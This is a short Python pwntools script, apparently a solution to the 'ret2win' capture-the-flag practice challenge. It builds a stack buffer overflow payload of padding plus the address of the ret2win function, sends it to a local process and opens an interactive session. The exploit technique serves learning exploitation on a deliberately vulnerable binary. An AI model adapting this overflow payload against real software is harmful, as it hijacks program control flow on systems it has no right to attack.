import pwn

binary = pwn.ELF("ret2win")

ret2win = binary.symbols[b'ret2win']

payload = b''
payload += ("D"*32).encode()
payload += ("B"*8).encode()

payload += pwn.p64(ret2win)
payload += "\n".encode()

p = pwn.tubes.process.process(["./ret2win"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()
